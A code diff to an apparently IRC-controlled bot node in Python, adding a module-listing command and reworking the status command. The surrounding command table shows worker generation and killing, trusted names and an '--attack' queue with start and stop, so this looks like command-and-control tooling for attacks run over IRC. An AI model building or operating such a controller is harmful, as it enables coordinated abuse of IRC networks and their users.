@@ -36,7 +36,8 @@ class IRCNode(irctargetedsocket.IRCTargetedSocket):
 			"-g" : [], # Generate workers
 			"-i" : ["add", "remove", "list"], # Ignore Names
 			"-k" : [], # Kill workers
-			"-s" : [], # Status,
+			"--modules" : ["list"],
+			"--status" : [], # Status,
 			"-T" : ["add", "remove", "list"], # Trusted Names
 			"--attack" : ["add", "remove", "list", "start", "stop"] # Attack Queue
 		}
@@ -64,7 +65,7 @@ class IRCNode(irctargetedsocket.IRCTargetedSocket):
 
 			# Server connected
 			if s  == "RPL_WELCOME":
-				if self.getNickname() == "camila":
+				if self.getNickname() == self.getContext():
 					for name in self.getTrustedNames():
 						for line in self.banner:
 							self.sendMessage(name, line)
@@ -169,14 +170,33 @@ class IRCNode(irctargetedsocket.IRCTargetedSocket):
 
 				self.getNotifier().publish(12, target, names)
 			
+			# Modules
+			elif command[1].lower() == '--modules':
+				l = []
+				for m in self.getModules():
+					module_name = str(m).split()[0].replace("[", "").replace("<", "")
+					s = "{0}@{1}".format(m.getModuleName(), module_name)
+					l.append(s)
+
+				if command[2].lower() == 'list':
+					self.listNames(target, "modules", l)
 				
 			# Status
-			elif command[1] == '-s':
+			elif command[1].lower() == '--status':
 				self.listNames(target, "attack_names", self.getAttackNames())
 				self.listNames(target, "ignore_names", self.getIgnoreNames())
 				self.listNames(target, "trusted_names", self.getTrustedNames())
 				self.listNames(target, "channels", self.getChannels())
 				self.listNames(target, "nodes", self.getNodeNames())
+
+				l = []
+				for m in self.getModules():
+					module_name = str(m).split()[0].replace("[", "").replace("<", "")
+					s = "{0}@{1}".format(m.getModuleName(), module_name)
+					l.append(s)
+				self.listNames(target, "modules", l)
+
+				#self.listNames(target, "attack_queue", )
 
 
 			elif command[1] == "--attack":
